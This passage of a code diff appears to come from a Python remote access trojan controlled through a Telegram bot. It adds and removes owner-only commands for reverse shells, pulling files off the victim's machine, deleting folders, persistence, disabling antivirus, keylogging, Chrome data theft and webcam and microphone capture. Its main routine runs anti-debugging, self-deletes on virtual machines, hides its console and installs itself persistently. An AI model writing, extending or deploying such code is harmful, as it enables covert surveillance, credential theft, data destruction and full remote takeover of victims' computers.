-        ip = context.args[0]
-        port = int(context.args[1])
-        threading.Thread(target=reverse_shell, args=(ip, port), daemon=True).start()
-        update.message.reply_text(f"Reverse shell started to {ip}:{port}")
-    else:
-        update.message.reply_text("Usage: /reverseshell IP PORT")
-
-def freeze_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    update.message.reply_text(freeze_input())
-
-def unfreeze_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    update.message.reply_text(unfreeze_input())
-
-def cd_handler(update, context):
-    global current_dir
+def download_handler(update, context):
     if update.effective_user.id != OWNER_ID:
         return
     path = ' '.join(context.args)
-    if path and os.path.exists(path):
-        current_dir = path
-        update.message.reply_text(f"Changed to {current_dir}")
+    if not path:
+        update.message.reply_text("Usage: /download C:\\path\\file")
+        return
+    file_path = download_file(path)
+    if file_path:
+        with open(file_path, 'rb') as f:
+            update.message.reply_document(document=f)
     else:
-        update.message.reply_text("Path not found")
+        update.message.reply_text("File not found")
 
-def env_handler(update, context):
+def deletefolder_handler(update, context):
     if update.effective_user.id != OWNER_ID:
         return
-    res = "\n".join([f"{k}={v}" for k, v in os.environ.items()])
-    update.message.reply_text(res[:4000])
+    path = ' '.join(context.args)
+    if path:
+        update.message.reply_text(delete_folder(path))
+    else:
+        update.message.reply_text("Usage: /deletefolder C:\\folder")
 
-def reg_get_handler(update, context):
+def persist_handler(update, context):
     if update.effective_user.id != OWNER_ID:
         return
-    if len(context.args) >= 2:
-        path = context.args[0]
-        key = context.args[1]
-        update.message.reply_text(reg_get(path, key)[:4000])
-    else:
-        update.message.reply_text("Usage: /reg_get HKLM\\SOFTWARE\\... KeyName")
+    update.message.reply_text(add_persistence_advanced())
 
-def reg_set_handler(update, context):
+def disableav_handler(update, context):
     if update.effective_user.id != OWNER_ID:
         return
-    if len(context.args) >= 3:
-        path = context.args[0]
-        key = context.args[1]
-        value = ' '.join(context.args[2:])
-        update.message.reply_text(reg_set(path, key, value))
+    update.message.reply_text(disable_antivirus())
+
+def msgbox_handler(update, context):
+    if update.effective_user.id != OWNER_ID:
+        return
+    text = ' '.join(context.args)
+    if text:
+        update.message.reply_text(show_message(text))
     else:
-        update.message.reply_text("Usage: /reg_set HKLM\\SOFTWARE\\... KeyName Value")
+        update.message.reply_text("Usage: /msgbox text")
+
+def altf4_handler(update, context):
+    if update.effective_user.id != OWNER_ID:
+        return
+    update.message.reply_text(alt_f4())
 
 def zipfolder_handler(update, context):
     if update.effective_user.id != OWNER_ID:
@@ -890,119 +949,47 @@ def zipfolder_handler(update, context):
     else:
         update.message.reply_text(res)
 
-def file_search_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    pattern = ' '.join(context.args)
-    if pattern:
-        res = search_files(pattern)
-        update.message.reply_text(res[:4000])
-    else:
-        update.message.reply_text("Usage: /file_search pattern")
-
-def help_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    help_text = """
-🐍 **RAT Commands:**
-
-**System:**
-/reboot, /shutdown, /lock, /minimize, /fullscreen, /altf4, /killtm
-/freeze, /unfreeze
-
-**Files:**
-/download <path>, /deletefolder <path>, /ls, /tree, /zipfolder, /file_search <pattern>
-
-**Network:**
-/openurl <url>, /wifi, /downloadnet <url> <dest>, /reverseshell <ip> <port>
-
-**Data:**
-/sysinfo, /processes, /clipboard, /chrome, /keylog start|stop|get
-
-**Media:**
-/screen, /screenrec <sec>, /webcam, /webcamrec <sec>, /mic <sec>
-
-**Audio/Display:**
-/mute, /unmute, /maxvol, /wallpaper <path>
-
-**Registry:**
-/reg_get <path> <key>, /reg_set <path> <key> <value>
-
-**Services:**
-/service_start <name>, /service_stop <name>
-
-**Other:**
-/cmd <command>, /persist, /disableav, /msgbox <text>, /cmdbomb, /cd <path>, /env
-"""
-    update.message.reply_text(help_text)
-
-# ==================== РЕГИСТРАЦИЯ КОМАНД ====================
 def register_handlers(dp):
     dp.add_handler(CommandHandler("start", start))
     dp.add_handler(CommandHandler("help", help_handler))
     dp.add_handler(CommandHandler("cmd", cmd_handler))
+    dp.add_handler(CommandHandler("sysinfo", sysinfo_handler))
     dp.add_handler(CommandHandler("screen", screen_handler))
     dp.add_handler(CommandHandler("webcam", webcam_handler))
-    dp.add_handler(CommandHandler("download", download_handler))
-    dp.add_handler(CommandHandler("persist", persist_handler))
-    dp.add_handler(CommandHandler("clipboard", clipboard_handler))
-    dp.add_handler(CommandHandler("chrome", chrome_handler))
-    dp.add_handler(CommandHandler("keylog", keylog_handler_cmd))
     dp.add_handler(CommandHandler("mic", mic_handler))
+    dp.add_handler(CommandHandler("keylog", keylog_handler_cmd))
+    dp.add_handler(CommandHandler("wifi", wifi_handler))
+    dp.add_handler(CommandHandler("chrome", chrome_handler))
     dp.add_handler(CommandHandler("reboot", reboot_handler))
     dp.add_handler(CommandHandler("shutdown", shutdown_handler))
-    dp.add_handler(CommandHandler("lock", lock_handler))
-    dp.add_handler(CommandHandler("minimize", minimize_handler))
-    dp.add_handler(CommandHandler("fullscreen", fullscreen_handler))
-    dp.add_handler(CommandHandler("scrollup", scrollup_handler))
-    dp.add_handler(CommandHandler("scrolldown", scrolldown_handler))
-    dp.add_handler(CommandHandler("sysinfo", sysinfo_handler))
-    dp.add_handler(CommandHandler("processes", processes_handler))
-    dp.add_handler(CommandHandler("disableav", antivirus_handler))
-    dp.add_handler(CommandHandler("deletefolder", deletefolder_handler))
-    dp.add_handler(CommandHandler("msgbox", messagebox_handler))
-    dp.add_handler(CommandHandler("downloadnet", downloadnet_handler))
-    dp.add_handler(CommandHandler("altf4", altf4_handler))
-    dp.add_handler(CommandHandler("screenrec", screenrec_handler))
-    dp.add_handler(CommandHandler("webcamrec", webcamrec_handler))
-    dp.add_handler(CommandHandler("openurl", openurl_handler))
-    dp.add_handler(CommandHandler("mute", mute_handler))
-    dp.add_handler(CommandHandler("maxvol", maxvol_handler))
-    dp.add_handler(CommandHandler("wallpaper", wallpaper_handler))
-    dp.add_handler(CommandHandler("unmute", unmute_handler))
-    dp.add_handler(CommandHandler("killtm", killtm_handler))
-    dp.add_handler(CommandHandler("cmdbomb", cmdbomb_handler))
-    dp.add_handler(CommandHandler("ls", ls_handler))
-    dp.add_handler(CommandHandler("tree", tree_handler))
-    dp.add_handler(CommandHandler("wifi", wifi_handler))
-    dp.add_handler(CommandHandler("service_start", service_start_handler))
-    dp.add_handler(CommandHandler("service_stop", service_stop_handler))
-    dp.add_handler(CommandHandler("revershell", revershell_handler))
     dp.add_handler(CommandHandler("freeze", freeze_handler))
     dp.add_handler(CommandHandler("unfreeze", unfreeze_handler))
-    dp.add_handler(CommandHandler("cd", cd_handler))
-    dp.add_handler(CommandHandler("env", env_handler))
-    dp.add_handler(CommandHandler("reg_get", reg_get_handler))
-    dp.add_handler(CommandHandler("reg_set", reg_set_handler))
+    dp.add_handler(CommandHandler("ls", ls_handler))
+    dp.add_handler(CommandHandler("tree", tree_handler))
+    dp.add_handler(CommandHandler("screenrec", screenrec_handler))
+    dp.add_handler(CommandHandler("webcamrec", webcamrec_handler))
+    dp.add_handler(CommandHandler("download", download_handler))
+    dp.add_handler(CommandHandler("deletefolder", deletefolder_handler))
+    dp.add_handler(CommandHandler("persist", persist_handler))
+    dp.add_handler(CommandHandler("disableav", disableav_handler))
+    dp.add_handler(CommandHandler("msgbox", msgbox_handler))
+    dp.add_handler(CommandHandler("altf4", altf4_handler))
     dp.add_handler(CommandHandler("zipfolder", zipfolder_handler))
-    dp.add_handler(CommandHandler("file_search", file_search_handler))
+    dp.add_handler(CallbackQueryHandler(button_callback))
 
 # ==================== MAIN ====================
 def main():
     anti_debug()
     self_delete_on_vm()
     hide_console()
-    
     if config.get("auto_persist", False):
         add_persistence_advanced()
-    
     if config.get("watchdog_enabled", False):
         start_watchdog()
-    
     updater = Updater(BOT_TOKEN, use_context=True)
     register_handlers(updater.dispatcher)
     updater.start_polling()
-    logger.info("🐍 RAT started. All functions loaded.")
+    logger.info("RAT started")
     updater.idle()
 
 if __name__ == "__main__":
